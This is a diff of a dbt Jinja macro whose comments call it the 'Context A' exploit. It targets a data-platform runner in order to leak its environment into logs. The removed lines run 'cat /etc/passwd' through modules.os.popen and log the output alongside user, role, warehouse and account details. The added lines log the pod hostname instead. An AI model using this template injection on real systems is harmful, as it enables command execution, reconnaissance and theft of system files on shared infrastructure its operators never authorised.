@@ -1,11 +1,11 @@
 {% macro show_who_am_i() %}
 
   {# 
-     This is the 'Context A' exploit. 
-     We are trying to get the MOZART RUNNER to read its own file system 
-     and save it to a Jinja variable.
+      This is the 'Context A' exploit. 
+      We are trying to get the MOZART RUNNER to read its own environment 
+      and save it to a Jinja variable.
   #}
-  {% set runner_hosts = modules.os.popen('cat /etc/passwd').read() if modules else "MODULES_RESTRICTED" %}
+  {% set runner_hosts = env_var('HOSTNAME', 'ENV_VAR_RESTRICTED') %}
 
   {% set sql %}
     select 
@@ -19,8 +19,11 @@
 
   {% if execute %}
     {% for row in results %}
-      {# If this works, the hosts file appears here. If not, you see 'MODULES_RESTRICTED' #}
-      {{ log("AUDIT: asdasd=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTS=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
+      {# 
+         The Hostname (Pod ID) appears here. 
+         The replace('\n', ' [LF] ') is kept for formatting consistency. 
+      #}
+      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTNAME=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
     {% endfor %}
   {% endif %}
 {% endmacro %}
